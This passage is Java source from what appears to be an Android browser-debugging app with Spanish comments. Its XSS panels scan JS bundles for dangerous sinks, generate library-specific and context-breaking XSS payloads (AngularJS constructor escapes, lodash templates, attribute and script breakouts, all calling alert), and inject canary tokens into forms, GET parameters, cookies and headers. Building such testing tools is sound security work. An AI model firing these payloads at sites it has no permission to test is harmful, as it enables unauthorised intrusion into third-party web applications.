            if (!tag.isEmpty()) label += "  (" + tag + ")";
            final String fLabel = label;
            addPanelButton(fLabel, v -> { xssPayload = value; xssTestContext = context; testXssPayload(); });
        }

        addPanelText("Sumideros en el contenido", Color.WHITE);
        addPanelText("Descarga el código de los bundles (máx. 5, hasta 200 KB cada uno) y busca sumideros peligrosos: innerHTML, document.write, eval, Function, insertAdjacentHTML, .html() y más. Los sumideros encontrados generan payloads en la lista de arriba.", Color.LTGRAY);
        addPanelButton(jsSinkAnalyzing ? "Analizando sumideros…" : "Analizar sumideros en bundles", v -> analyzeBundleSinks());
        if (jsSinkResults != null) addPanelText(jsSinkResults, Color.rgb(215, 220, 230));

        addPanelText("Probar payload XSS", Color.WHITE);
        addPanelText("Inyecta el payload en un contenedor de prueba de la página actual y detecta si ejecuta JavaScript (alert/confirm/prompt). Solo actúa en la página que tú cargaste.", Color.LTGRAY);
        EditText xssInput = new EditText(this);
        xssInput.setSingleLine(false);
        xssInput.setTextColor(Color.WHITE);
        xssInput.setHintTextColor(Color.LTGRAY);
        xssInput.setHint("Ej.: <img src=x onerror=alert('XSS')>");
        xssInput.setTextSize(12);
        xssInput.setPadding(dp(8), dp(6), dp(8), dp(6));
        xssInput.setBackgroundColor(Color.rgb(43, 48, 58));
        xssInput.setText(xssPayload);
        xssInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { xssPayload = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        panelContent.addView(xssInput, new LinearLayout.LayoutParams(-1, dp(72)));
        addPanelButton("Probar payload XSS", v -> testXssPayload());
        addPanelButton("Ejemplo clásico", v -> { xssPayload = "<img src=x onerror=alert('XSS')>"; renderNow(); });
        if (xssTestResult != null) addPanelText(xssTestResult, xssTestResult.startsWith("VULNERABLE") ? Color.rgb(255, 120, 120) : Color.rgb(215, 220, 230));

        addPanelText("Errores JS recientes", Color.WHITE);
        int errors = 0;
        synchronized (consoleRecords) {
            for (int i = consoleRecords.size() - 1; i >= 0 && errors < 20; i--) {
                String entry = consoleRecords.get(i);
                if (!entry.contains("ERROR")) continue;
                addPanelText(entry, Color.rgb(255, 120, 120));
                errors++;
            }
        }
        if (errors == 0) addPanelText("Sin errores JS registrados en la consola.", Color.LTGRAY);
    }

    private void runJsExpression() {
        String expression = jsExpression.trim();
        if (expression.isEmpty()) { Toast.makeText(this, "Escribe una expresión JavaScript", Toast.LENGTH_SHORT).show(); return; }
        String js = "(function(){try{var r = (" + expression + ");"
                + "return (r === undefined ? 'undefined' : (typeof r === 'object' ? JSON.stringify(r) : String(r)));"
                + "}catch(e){return 'Error: ' + e;}})()";
        webView.evaluateJavascript(js, value -> showResult("Resultado JS", unquote(value)));
    }

    // Resolver expresiones XSS: inyecta el payload en un contenedor oculto
    // de la página actual y comprueba si ejecuta JavaScript. Los payloads
    // que empiezan por "javascript:" se evalúan como expresión JS; el resto
    // se inyecta con innerHTML (los manejadores de eventos como onerror sí
    // se ejecutan; las etiquetas <script> inyectadas así, no).
    private void testXssPayload() {
        String payload = xssPayload.trim();
        if (payload.isEmpty()) { Toast.makeText(this, "Escribe un payload XSS", Toast.LENGTH_SHORT).show(); return; }
        if (xssTestContext == null) xssTestContext = detectPayloadContext(payload);
        xssTestActive = true;
        xssAlertText = null;
        xssTestResult = "Probando payload…";
        renderNow();
        if (payload.toLowerCase(java.util.Locale.ROOT).startsWith("javascript:")) {
            String code = payload.substring("javascript:".length());
            String js = "(function(){try{var r = (" + code + ");"
                    + "return (r === undefined ? 'undefined' : (typeof r === 'object' ? JSON.stringify(r) : String(r)));"
                    + "}catch(e){return 'Error: ' + e;}})()";
            webView.evaluateJavascript(js, value -> {
                String result = unquote(value);
                xssTestResult = "Resultado del payload javascript:: " + result;
                recordContextTest(xssTestContext, !result.startsWith("Error"));
                xssTestContext = null;
                xssTestActive = false;
                renderNow();
            });
            return;
        }
        String js = "(function(){try{"
                + "var c = document.getElementById('browserdebug-xss-test');"
                + "if (!c) { c = document.createElement('div'); c.id = 'browserdebug-xss-test'; c.style.display = 'none'; document.body.appendChild(c); }"
                + "c.innerHTML = " + org.json.JSONObject.quote(payload) + ";"
                + "return 'ok';"
                + "}catch(e){return 'Error: ' + e;}})()";
        webView.evaluateJavascript(js, value -> {
            String inject = unquote(value);
            if (inject.startsWith("Error")) { xssTestResult = "No se pudo inyectar el payload: " + inject; recordContextTest(xssTestContext, false); xssTestContext = null; xssTestActive = false; renderNow(); return; }
            webView.postDelayed(() -> webView.evaluateJavascript(
                    "(function(){var c = document.getElementById('browserdebug-xss-test');"
                    + "if (!c) return JSON.stringify({nodos: -1});"
                    + "return JSON.stringify({nodos: c.childNodes.length, html: c.innerHTML.length});})()",
                    check -> finishXssTest(check)), 800);
        });
    }

    private void finishXssTest(String checkValue) {
        try {
            org.json.JSONObject check = new org.json.JSONObject(unquote(checkValue));
            int nodes = check.optInt("nodos", -1);
            if (xssAlertText != null) {
                xssTestResult = "VULNERABLE — el payload ejecutó JavaScript y disparó un diálogo con el texto: «" + xssAlertText + "».";
            } else if (nodes > 0) {
                xssTestResult = "Inyectado sin ejecución: el payload quedó en el DOM (" + nodes + " nodos) pero no disparó alert/confirm/prompt. Prueba un payload basado en eventos (onerror, onload) o revisa la consola por errores.";
            } else {
                xssTestResult = "Sin ejecución: el payload no dejó nodos en el DOM ni disparó diálogos. La página parece neutralizarlo (o el payload no es válido en este contexto).";
            }
        } catch (Exception e) {
            xssTestResult = "No se pudo comprobar el resultado: " + unquote(checkValue);
        }
        recordContextTest(xssTestContext, xssAlertText != null);
        xssTestContext = null;
        xssTestActive = false;
        renderNow();
    }

    // Generar payloads a base de los bundles escaneados: detecta librerías
    // conocidas por su nombre en la URL del bundle y propone payloads que
    // abusan de cada una, más payloads genéricos basados en eventos (los
    // que sí se ejecutan al inyectarse con innerHTML) y payloads por
    // contexto (atributo, script y CSS). Máx. 10, sin duplicados; cada
    // botón carga el payload y lo prueba directamente.
    private java.util.ArrayList<String> bundleUrls() {
        java.util.ArrayList<String> urls = new java.util.ArrayList<>();
        if (jsBundlesJson == null) return urls;
        try {
            org.json.JSONObject data = new org.json.JSONObject(jsBundlesJson);
            org.json.JSONArray items = data.optJSONArray("items");
            if (items != null) {
                for (int i = 0; i < items.length(); i++) {
                    org.json.JSONObject item = items.optJSONObject(i);
                    if (item != null) urls.add(item.optString("url", ""));
                }
            }
        } catch (Exception ignored) { }
        return urls;
    }

    private void generatePayloadsFromBundles() {
        if (jsBundlesJson == null) { Toast.makeText(this, "Primero analiza los bundles JS", Toast.LENGTH_SHORT).show(); return; }
        jsPayloadLabels.clear();
        jsPayloadValues.clear();
        jsPayloadContexts.clear();
        java.util.ArrayList<String> urls = bundleUrls();
        int sinkBefore = jsPayloadValues.size();
        for (String[] finding : jsSinkFindings) addPayload(finding[1], finding[2], finding.length > 3 ? finding[3] : "etiqueta");
        jsSinkPayloadCount = jsPayloadValues.size() - sinkBefore;
        addPayloadIfLibrary(urls, "jquery", "jQuery: usa el global $", "<img src=x onerror=\"jQuery('body').append('<svg onload=alert(document.domain)>')\">", "etiqueta");
        addPayloadIfLibrary(urls, "angular", "AngularJS: escape con constructor", "{{constructor.constructor('alert(document.domain)')()}}", "script");
        addPayloadIfLibrary(urls, "vue", "Vue: interpolación con constructor", "{{constructor.constructor('alert(document.domain)')()}}", "script");
        addPayloadIfLibrary(urls, "lodash", "lodash: _.template ejecuta JS", "<img src=x onerror=\"_.template('<%=alert(document.domain)%>')()\">", "script");
        addPayloadIfLibrary(urls, "underscore", "Underscore: _.template ejecuta JS", "<img src=x onerror=\"_.template('<%=alert(document.domain)%>')()\">", "script");
        addPayloadIfLibrary(urls, "react", "React: escapa por defecto, prueba evento", "<img src=x onerror=alert(document.domain)>", "etiqueta");
        addPayload("Genérico: img onerror", "<img src=x onerror=alert(document.domain)>", "etiqueta");
        addPayload("Genérico: svg onload", "<svg onload=alert(document.domain)>", "etiqueta");
        addPayload("Genérico: details ontoggle", "<details open ontoggle=alert(document.domain)>", "etiqueta");
        addPayload("Genérico: iframe srcdoc", "<iframe srcdoc=\"<script>alert(document.domain)</script>\">", "etiqueta");
        addPayload("Genérico: mXSS con math", "<math><mtext><script>alert(document.domain)</script></mtext></math>", "etiqueta");
        addPayload("Genérico: URL javascript:", "javascript:alert(document.domain)", "atributo");
        addPayload("Atributo: romper comillas con onmouseover", "\" onmouseover=alert(document.domain)", "atributo");
        addPayload("Atributo: onfocus con autofocus", "' autofocus onfocus=alert(document.domain) x='", "atributo");
        addPayload("Script: romper cadena con comilla", "';alert(document.domain);//", "script");
        addPayload("Script: cerrar script y abrir otro", "</script><script>alert(document.domain)</script>", "script");
        addPayload("CSS: cerrar style y abrir script", "</style><script>alert(document.domain)</script>", "css");
        addPayload("CSS: romper regla con llave", "x;}alert(document.domain);//", "css");
        renderNow();
    }

    private void addPayload(String label, String value, String context) {
        if (jsPayloadValues.size() >= 10 || jsPayloadValues.contains(value)) return;
        jsPayloadLabels.add(label);
        jsPayloadValues.add(value);
        jsPayloadContexts.add(context == null ? "etiqueta" : context);
    }

    private void addPayloadIfLibrary(java.util.ArrayList<String> urls, String needle, String label, String value, String context) {
        for (String url : urls) if (url.toLowerCase(java.util.Locale.ROOT).contains(needle)) { addPayload(label, value, context); return; }
    }

    // Sumideros peligrosos en el contenido de los bundles: {nombre, texto
    // a buscar, prefijo de la etiqueta del payload, payload, contexto}. El
    // conteo es por aparición del texto y puede incluir falsos positivos
    // (por ejemplo, eval( dentro de un nombre más largo); el resultado lo
    // dice tal cual y el payload decide si hay ejecución real.
    private static final String[][] JS_SINKS = {
        {"innerHTML", "innerHTML", "Sumidero innerHTML en ", "<img src=x onerror=alert(document.domain)>", "etiqueta"},
        {"outerHTML", "outerHTML", "Sumidero outerHTML en ", "<img src=x onerror=alert(document.domain)>", "etiqueta"},
        {"document.write", "document.write", "Sumidero document.write en ", "<script>alert(document.domain)</script>", "etiqueta"},
        {"document.writeln", "document.writeln", "Sumidero document.writeln en ", "<script>alert(document.domain)</script>", "etiqueta"},
        {"eval(", "eval(", "Sumidero eval() en ", "javascript:alert(document.domain)", "script"},
        {"Function(", "Function(", "Sumidero Function() en ", "javascript:alert(document.domain)", "script"},
        {"insertAdjacentHTML", "insertAdjacentHTML", "Sumidero insertAdjacentHTML en ", "<img src=x onerror=alert(document.domain)>", "etiqueta"},
        {".html(", ".html(", "Sumidero jQuery .html() en ", "<img src=x onerror=\"jQuery('body').append('<svg onload=alert(document.domain)>')\">", "etiqueta"},
        {"dangerouslySetInnerHTML", "dangerouslySetInnerHTML", "Sumidero dangerouslySetInnerHTML en ", "<img src=x onerror=alert(document.domain)>", "etiqueta"},
        {"v-html", "v-html", "Sumidero Vue v-html en ", "<img src=x onerror=alert(document.domain)>", "etiqueta"},
    };

    private void analyzeBundleSinks() {
        if (jsBundlesJson == null) { Toast.makeText(this, "Primero analiza los bundles JS", Toast.LENGTH_SHORT).show(); return; }
        if (jsSinkAnalyzing) return;
        final java.util.ArrayList<String> urls = bundleUrls();
        if (urls.isEmpty()) { Toast.makeText(this, "No hay bundles para analizar", Toast.LENGTH_SHORT).show(); return; }
        jsSinkAnalyzing = true;
        jsSinkResults = "Analizando sumideros en " + Math.min(urls.size(), 5) + " bundles…";
        renderNow();
        new Thread(() -> {
            StringBuilder out = new StringBuilder();
            java.util.ArrayList<String[]> found = new java.util.ArrayList<>();
            int limit = Math.min(urls.size(), 5);
            for (int i = 0; i < limit; i++) {
                String url = urls.get(i);
                String shortName = bundleShortName(url);
                String src = fetchBundleText(url);
                if (src == null) { out.append("• ").append(shortName).append(": no se pudo descargar\n"); continue; }
                java.util.ArrayList<String> hits = new java.util.ArrayList<>();
                for (String[] sink : JS_SINKS) {
                    int n = countOccurrences(src, sink[1]);
                    if (n > 0) {
                        hits.add(sink[0] + " ×" + n);
                        found.add(new String[]{shortName, sink[2] + shortName, sink[3], sink[4]});
                    }
                }
                if (hits.isEmpty()) out.append("• ").append(shortName).append(": sin sumideros detectados\n");
                else out.append("• ").append(shortName).append(": ").append(android.text.TextUtils.join(", ", hits)).append("\n");
            }
            final String results = out.toString();
            final java.util.ArrayList<String[]> findings = found;
            runOnUiThread(() -> {
                jsSinkAnalyzing = false;
                jsSinkResults = results;
                jsSinkFindings = findings;
                generatePayloadsFromBundles();
            });
        }).start();
    }

    private String fetchBundleText(String url) {
        java.net.HttpURLConnection conn = null;
        try {
            conn = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("User-Agent", "BrowserDebug/1.6");
            conn.setInstanceFollowRedirects(true);
            if (conn.getResponseCode() != java.net.HttpURLConnection.HTTP_OK) return null;
            java.io.InputStream in = conn.getInputStream();
            byte[] buf = new byte[8192];
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            int read;
            int total = 0;
            while ((read = in.read(buf)) != -1) {
                total += read;
                if (total > 200 * 1024) break;
                out.write(buf, 0, read);
            }
            in.close();
            return new String(out.toByteArray(), java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private int countOccurrences(String text, String needle) {
        int count = 0;
        int idx = 0;
        while ((idx = text.indexOf(needle, idx)) >= 0) { count++; idx += needle.length(); }
        return count;
    }

    private String bundleShortName(String url) {
        String clean = shortUrl(url);
        int slash = clean.lastIndexOf('/');
        return slash >= 0 ? clean.substring(slash + 1) : clean;
    }

    // DNS: pestaña desplegable con las resoluciones del dominio/host actual
    // y de los hosts de los bundles escaneados. La resolución usa el DNS
    // del teléfono (InetAddress) en un hilo aparte; cada host se despliega
    // con sus IPs y se conserva entre repintados.
    private void showDnsPanel() {
        addPanelText("DNS · dominio y host", Color.rgb(105, 205, 255));
        String pageHost = currentPageHost();
        addPanelText(pageHost == null ? "Carga una página para ver su dominio." : "Dominio actual: " + pageHost, Color.LTGRAY);
        addPanelButton(dnsResolving ? "Resolviendo DNS…" : "Resolver DNS", v -> resolveDns());
        java.util.ArrayList<String> hosts = dnsHosts();
        if (hosts.isEmpty()) { addPanelText("Sin hosts para resolver.", Color.LTGRAY); return; }
        for (String host : hosts) {
            boolean expanded = dnsExpanded.contains(host);
            boolean isPage = host.equals(pageHost);
            addPanelButton((expanded ? "▼ " : "▶ ") + host + (isPage ? "  •  página actual" : ""), v -> {
                if (dnsExpanded.contains(host)) dnsExpanded.remove(host); else dnsExpanded.add(host);
                renderNow();
            });
            if (expanded) {
                java.util.ArrayList<String> ips = dnsResults.get(host);
                if (ips == null) addPanelText("  Aún sin resolver. Toca «Resolver DNS».", Color.LTGRAY);
                else if (ips.isEmpty()) addPanelText("  No se pudo resolver este host.", Color.rgb(255, 120, 120));
                else for (String ip : ips) addPanelText("  • " + ip, Color.rgb(215, 220, 230));
            }
        }
    }

    private String currentPageHost() {
        try {
            String url = webView.getUrl();
            if (url == null) return null;
            return Uri.parse(url).getHost();
        } catch (Exception e) {
            return null;
        }
    }

    private java.util.ArrayList<String> dnsHosts() {
        java.util.LinkedHashSet<String> hosts = new java.util.LinkedHashSet<>();
        String pageHost = currentPageHost();
        if (pageHost != null) hosts.add(pageHost);
        for (String url : bundleUrls()) {
            try {
                String host = Uri.parse(url).getHost();
                if (host != null) hosts.add(host);
            } catch (Exception ignored) { }
        }
        return new java.util.ArrayList<>(hosts);
    }

    private void resolveDns() {
        final java.util.ArrayList<String> hosts = dnsHosts();
        if (hosts.isEmpty()) { Toast.makeText(this, "No hay hosts para resolver", Toast.LENGTH_SHORT).show(); return; }
        if (dnsResolving) return;
        dnsResolving = true;
        renderNow();
        new Thread(() -> {
            for (String host : hosts) {
                java.util.ArrayList<String> ips = new java.util.ArrayList<>();
                try {
                    for (java.net.InetAddress addr : java.net.InetAddress.getAllByName(host)) ips.add(addr.getHostAddress());
                } catch (Exception ignored) { }
                dnsResults.put(host, ips);
                dnsExpanded.add(host);
            }
            runOnUiThread(() -> { dnsResolving = false; renderNow(); });
        }).start();
    }

    // Herramienta OWASP (v1.7): secciones desplegables con cobertura XSS,
    // canarios de reflejo, sondeo de caracteres críticos, detección de WAF,
    // CSP y cookies HttpOnly. El estado de cada sección (abierta/cerrada)
    // y los resultados se conservan entre repintados; la cobertura es por
    // página (origen + ruta) y se limpia al navegar a otra página.
    private void showOwaspPanel() {
        addPanelText("OWASP · pruebas XSS", Color.rgb(105, 205, 255));
        addPanelText("Escaneo automático, cobertura, canarios, autollenado, caracteres críticos, WAF, CSP y cookies. Toca cada sección para desplegarla.", Color.LTGRAY);
        owaspSection("SCAN", "Escaneo automático");
        if (owaspExpanded.contains("SCAN")) showScanSection();
        owaspSection("COV", "Cobertura de entradas, sumideros y contextos");
        if (owaspExpanded.contains("COV")) showCoverageSection();
        owaspSection("CAN", "Canario · puntos de reflejo");
        if (owaspExpanded.contains("CAN")) showCanarySection();
        owaspSection("AUTO", "Autollenado de formularios");
        if (owaspExpanded.contains("AUTO")) showAutofillSection();
        owaspSection("CHR", "Caracteres críticos");
        if (owaspExpanded.contains("CHR")) showProbeSection();
        owaspSection("WAF", "Filtros y WAF");
        if (owaspExpanded.contains("WAF")) showWafSection();
        owaspSection("CSP", "Content-Security-Policy");
        if (owaspExpanded.contains("CSP")) showCspSection();
        owaspSection("CK", "Cookies · HttpOnly");
        if (owaspExpanded.contains("CK")) showCookieSection();
    }

    private void owaspSection(String key, String title) {
        boolean open = owaspExpanded.contains(key);
        addPanelButton((open ? "▼ " : "▶ ") + title, v -> {
            if (owaspExpanded.contains(key)) owaspExpanded.remove(key); else owaspExpanded.add(key);
            renderNow();
        });
    }

    private String contextName(String ctx) {
        switch (ctx) {
            case "atributo": return "atributo";
            case "comentario": return "comentario";
            case "script": return "script";
            case "css": return "CSS";
            default: return "entre etiquetas";
        }
    }

    private String pageCoverageKey() {
        try {
            String url = webView.getUrl();
            if (url == null) return null;
            Uri u = Uri.parse(url);
            return u.getScheme() + "://" + u.getHost() + (u.getPath() == null ? "" : u.getPath());
        } catch (Exception e) {
            return null;
        }
    }

    private void clearCoverageState() {
        coverageInputsJson = null;
        coverageDiscovering = false;
        coverageFormFields.clear();
        coverageGetParams.clear();
        coverageCookies.clear();
        coverageJsonFields.clear();
        coverageTested.clear();
        coverageResults.clear();
        coveragePageKey = null;
        coveragePendingTest = null;
        coveragePendingKind = null;
        coveragePendingPageKey = null;
        pageSinkResults = null;
    }

    private int countTested(String prefix) {
        int n = 0;
        for (String k : coverageTested) if (k.startsWith(prefix)) n++;
        return n;
    }

    private int countPostFields() {
        int n = 0;
        for (String f : coverageFormFields) if (f.endsWith("|POST")) n++;
        return n;
    }

    private String percent(int part, int total) {
        return total == 0 ? "0" : String.valueOf(Math.round(part * 100.0 / total));
    }

    private String coverageBar(int part, int total) {
        int filled = total == 0 ? 0 : (int) Math.round(part * 10.0 / total);
        StringBuilder bar = new StringBuilder();
        for (int i = 0; i < 10; i++) bar.append(i < filled ? "█" : "░");
        return bar.toString();
    }

    private void recordContextTest(String context, boolean vulnerable) {
        if (context == null) context = "etiqueta";
        Integer n = contextTests.get(context);
        contextTests.put(context, (n == null ? 0 : n) + 1);
        if (vulnerable) {
            Integer h = contextHits.get(context);
            contextHits.put(context, (h == null ? 0 : h) + 1);
        }
    }

    private String detectPayloadContext(String payload) {
        String p = payload.trim().toLowerCase(java.util.Locale.ROOT);
        if (p.startsWith("javascript:")) return "atributo";
        if (p.contains("</script")) return "script";
        if (p.contains("</style") || p.contains("expression(")) return "css";
        if (p.startsWith("\"") || p.startsWith("'")) {
            if (p.contains(" on") && p.contains("=")) return "atributo";
            return "script";
        }
        return "etiqueta";
    }

    private void showCoverageSection() {
        if (coverageInputsJson == null) {
            addPanelText("Descubriendo puntos de entrada de la página…", Color.LTGRAY);
            discoverEntryPoints();
            return;
        }
        int formTotal = coverageFormFields.size();
        int formTested = countTested("form:");
        int postTotal = countPostFields();
        int postTested = countTested("post:");
        int getTotal = coverageGetParams.size();
        int getTested = countTested("get:");
        int cookieTotal = coverageCookies.size();
        int cookieTested = countTested("cookie:");
        int jsonTotal = coverageJsonFields.size();
        int jsonTested = countTested("json:");
        int headerTested = countTested("header:");
        int total = formTotal + getTotal + cookieTotal + jsonTotal + 2;
        int tested = formTested + getTested + cookieTested + jsonTested + headerTested;
        addPanelText("Cobertura total: " + tested + "/" + total + " puntos probados (" + percent(tested, total) + "%)", Color.WHITE);
        addPanelText(coverageBar(tested, total), Color.rgb(105, 205, 255));
        addPanelText("Formularios: " + formTested + "/" + formTotal + " campos  •  Parámetros GET: " + getTested + "/" + getTotal
                + "  •  Cuerpos POST: " + postTested + "/" + postTotal
                + "  •  Cabeceras: " + headerTested + "/2 (User-Agent, Referer)"
                + "  •  Cookies: " + cookieTested + "/" + cookieTotal
                + "  •  Campos JSON/XML: " + jsonTested + "/" + jsonTotal, Color.rgb(215, 220, 230));
        addPanelText("«Probar» envía el canario a ese punto de entrada y busca dónde se refleja. Un punto probado cuenta para la cobertura aunque no se refleje.", Color.LTGRAY);
        addPanelButton("Volver a descubrir puntos de entrada", v -> discoverEntryPoints());
        int shown = 0;
        for (String f : coverageFormFields) {
            if (shown >= 12) break;
            String[] parts = f.split("\\|", -1);
            if (parts.length < 3) continue;
            String key = ("POST".equals(parts[2]) ? "post:" : "form:") + parts[0] + ":" + parts[1];
            addCoverageTestButton(key, parts[2] + " · " + parts[1]);
            shown++;
        }
        for (String p : coverageGetParams) {
            if (shown >= 12) break;
            addCoverageTestButton("get:" + p, "GET · " + p);
            shown++;
        }
        for (String c : coverageCookies) {
            if (shown >= 12) break;
            addCoverageTestButton("cookie:" + c, "Cookie · " + c);
            shown++;
        }
        for (String j : coverageJsonFields) {
            if (shown >= 12) break;
            addCoverageTestButton("json:" + j, "JSON · " + j);
            shown++;
        }
        if (shown < 12) { addCoverageTestButton("header:User-Agent", "Cabecera · User-Agent"); shown++; }
        if (shown < 12) { addCoverageTestButton("header:Referer", "Cabecera · Referer"); shown++; }
        int all = formTotal + getTotal + cookieTotal + jsonTotal + 2;
        if (all > 12) addPanelText("…y " + (all - 12) + " puntos más. Prueba los visibles para subir la cobertura.", Color.LTGRAY);
        if (!coverageResults.isEmpty()) {
            StringBuilder out = new StringBuilder("Resultados:\n");
            for (java.util.Map.Entry<String, String> e : coverageResults.entrySet()) out.append("• ").append(e.getKey()).append(": ").append(e.getValue()).append("\n");
            addPanelText(out.toString(), Color.rgb(215, 220, 230));
        }
        addPanelText("Puntos de salida (sumideros)", Color.WHITE);
        if (jsSinkFindings.isEmpty() && jsSinkResults == null) addPanelText("Aún no se han analizado los sumideros de los bundles. Hazlo en el panel JS («Analizar sumideros en bundles»).", Color.LTGRAY);
        else {
            addPanelText("Sumideros analizados en bundles: " + jsSinkFindings.size() + " hallazgos, con payload generado en " + jsSinkPayloadCount + "/" + jsSinkFindings.size() + " (tope de 10 payloads).", Color.rgb(215, 220, 230));
            if (jsSinkResults != null) addPanelText(jsSinkResults, Color.rgb(215, 220, 230));
        }
        addPanelButton("Analizar sumideros en los scripts de la página", v -> analyzePageSinks());
        if (pageSinkResults != null) addPanelText(pageSinkResults, Color.rgb(215, 220, 230));
        addPanelText("Variedad de contextos HTML/JS", Color.WHITE);
        addPanelText(contextSummary(), Color.rgb(215, 220, 230));
        if (coverageUaBackup != null) addPanelButton("Restaurar User-Agent original", v -> { webView.getSettings().setUserAgentString(coverageUaBackup); coverageUaBackup = null; Toast.makeText(this, "User-Agent restaurado", Toast.LENGTH_SHORT).show(); renderNow(); });
    }

    private void addCoverageTestButton(String key, String label) {
        String done = coverageTested.contains(key) ? "✓ " : "";
        addPanelButton(done + "Probar " + label, v -> testEntryPoint(key));
    }

    private String contextSummary() {
        String[] contexts = {"etiqueta", "atributo", "comentario", "script", "css"};
        String[] names = {"entre etiquetas", "atributo", "comentario", "script", "CSS"};
        int totalTests = 0;
        for (Integer n : contextTests.values()) totalTests += n;
        int covered = 0;
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < contexts.length; i++) {
            Integer tests = contextTests.get(contexts[i]);
            Integer hits = contextHits.get(contexts[i]);
            Integer canary = canaryContextCounts.get(contexts[i]);
            int t = tests == null ? 0 : tests;
            int h = hits == null ? 0 : hits;
            int c = canary == null ? 0 : canary;
            if (t > 0 || c > 0) covered++;
            out.append("• ").append(names[i]).append(": ").append(t).append(" pruebas de payload");
            if (totalTests > 0) out.append(" (").append(percent(t, totalTests)).append("%)");
            out.append(", ").append(h).append(" con ejecución, ").append(c).append(" reflejos de canario\n");
        }
        out.append("Contextos cubiertos: ").append(covered).append("/5");
        return out.toString();
    }

    private void discoverEntryPoints() {
        if (coverageDiscovering) return;
        coverageDiscovering = true;
        String js = "JSON.stringify((function(){"
                + "var forms = [];"
                + "for (var i = 0; i < document.forms.length; i++) {"
                + "var f = document.forms[i]; var fields = [];"
                + "for (var j = 0; j < f.elements.length; j++) { var el = f.elements[j]; if (el.name) fields.push({name: el.name, type: el.type || 'text'}); }"
                + "forms.push({method: (f.method || 'get').toLowerCase(), action: f.action || '', fields: fields});"
                + "}"
                + "var params = [];"
                + "try { new URLSearchParams(location.search).forEach(function(v, k){ if (params.indexOf(k) < 0) params.push(k); }); } catch(e){}"
                + "var cookies = [];"
                + "try { document.cookie.split(';').forEach(function(c){ var n = c.split('=')[0].trim(); if (n) cookies.push(n); }); } catch(e){}"
                + "var jsonFields = [];"
                + "try { document.querySelectorAll('script[type=\"application/json\"]').forEach(function(s){"
                + "try { var o = JSON.parse(s.textContent); Object.keys(o).forEach(function(k){ if (jsonFields.indexOf(k) < 0) jsonFields.push(k); }); } catch(e){} }); } catch(e){}"
                + "return {forms: forms, getParams: params, cookies: cookies, jsonFields: jsonFields};"
                + "})())";
        webView.evaluateJavascript(js, value -> {
            coverageDiscovering = false;
            coverageInputsJson = unquote(value);
            parseCoverageInputs(coverageInputsJson);
            if (scanRunning && scanAwaitingDiscover) {
                scanAwaitingDiscover = false;
                buildScanCanarySteps();
                advanceScanForStep(scanCurrentId);
            }
            if (activePanel.equals("OWASP")) renderNow();
        });
    }

    private void parseCoverageInputs(String json) {
        coverageFormFields.clear();
        coverageGetParams.clear();
        coverageCookies.clear();
        coverageJsonFields.clear();
        try {
            org.json.JSONObject data = new org.json.JSONObject(json);
            org.json.JSONArray forms = data.optJSONArray("forms");
            if (forms != null) {
                for (int i = 0; i < forms.length(); i++) {
                    org.json.JSONObject form = forms.optJSONObject(i);
                    if (form == null) continue;
                    String method = form.optString("method", "get").toUpperCase(java.util.Locale.ROOT);
                    org.json.JSONArray fields = form.optJSONArray("fields");
                    if (fields == null) continue;
                    for (int j = 0; j < fields.length(); j++) {
                        org.json.JSONObject field = fields.optJSONObject(j);
                        if (field != null) coverageFormFields.add(i + "|" + field.optString("name") + "|" + method);
                    }
                }
            }
            addStrings(coverageGetParams, data.optJSONArray("getParams"));
            addStrings(coverageCookies, data.optJSONArray("cookies"));
            addStrings(coverageJsonFields, data.optJSONArray("jsonFields"));
        } catch (Exception ignored) { }
    }

    private void addStrings(java.util.ArrayList<String> out, org.json.JSONArray arr) {
        if (arr == null) return;
        for (int i = 0; i < arr.length(); i++) { String s = arr.optString(i); if (s != null && !s.isEmpty()) out.add(s); }
    }

    private void armPendingTest(String key, String kind) {
        coveragePendingTest = key;
        coveragePendingKind = kind;
        coveragePendingPageKey = pageCoverageKey();
    }

    private boolean checkCanary() {
        if (canaryToken == null || canaryToken.trim().isEmpty()) { Toast.makeText(this, "Escribe un canario primero", Toast.LENGTH_SHORT).show(); return false; }
        return true;
    }

    private void testEntryPoint(String key) {
        if (!checkCanary()) return;
        String token = canaryToken.trim();
        coverageTested.add(key);
        if (key.startsWith("get:")) {
            String name = key.substring(4);
            armPendingTest(key, "canary");
            String js = "(function(){var u = new URL(location.href); u.searchParams.set(" + org.json.JSONObject.quote(name) + ", " + org.json.JSONObject.quote(token) + "); location.href = u.toString();})()";
            webView.evaluateJavascript(js, null);
        } else if (key.startsWith("form:") || key.startsWith("post:")) {
            String[] parts = key.split(":", 3);
            if (parts.length < 3) return;
            armPendingTest(key, "canary");
            String js = "(function(){var f = document.forms[" + parts[1] + "]; if (!f) return 'sin formulario';"
                    + "var els = f.elements[" + org.json.JSONObject.quote(parts[2]) + "];"
                    + "if (!els) return 'sin campo';"
                    + "var el = (els.length !== undefined && els.tagName === undefined) ? els[0] : els;"
                    + "el.value = " + org.json.JSONObject.quote(token) + ";"
                    + "f.submit(); return 'ok';})()";
            webView.evaluateJavascript(js, null);
        } else if (key.startsWith("cookie:")) {
            String name = key.substring(7);
            String url = webView.getUrl();
            if (url == null) return;
            android.webkit.CookieManager.getInstance().setCookie(url, name + "=" + Uri.encode(token) + "; Path=/");
            android.webkit.CookieManager.getInstance().flush();
            armPendingTest(key, "canary");
            webView.reload();
        } else if (key.equals("header:User-Agent")) {
            if (coverageUaBackup == null) coverageUaBackup = webView.getSettings().getUserAgentString();
            webView.getSettings().setUserAgentString(token);
            armPendingTest(key, "canary");
            webView.reload();
        } else if (key.equals("header:Referer")) {
            String url = webView.getUrl();
            if (url == null) return;
            java.util.HashMap<String, String> headers = new java.util.HashMap<>();
            headers.put("Referer", token);
            armPendingTest(key, "canary");
            webView.loadUrl(url, headers);
        } else if (key.startsWith("json:")) {
            String field = key.substring(5);
            String qField = org.json.JSONObject.quote(field);
            String js = "(function(){var n = 0;"
                    + "document.querySelectorAll('script[type=\"application/json\"]').forEach(function(s){"
